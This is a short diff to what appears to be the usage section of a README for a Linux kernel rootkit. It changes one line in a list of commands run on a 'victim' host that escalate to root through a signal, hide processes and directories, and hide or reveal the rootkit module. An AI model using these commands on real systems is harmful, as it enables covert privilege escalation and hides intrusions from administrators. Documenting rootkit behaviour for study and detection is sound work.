@@ -94,7 +94,7 @@ root@kali ~ ssh newuser@10.10.110.101
 victim@ubuntu ~ kill -64 0 # Promtes to root user. 
 victim@ubuntu ~ mkdir dynasty_persist # Any directory starting with dynasty will be hidden.
 victim@ubuntu ~ kill -31 <process> # Hides processors
-victim@ubuntu ~ lsmod | grep -i root # Hides itself 
+victim@ubuntu ~ lsmod | grep -i diamorphine # Hides itself 
 victim@ubuntu ~ kill -63 0 # Make it appear in lsmod output
 ``` 
 
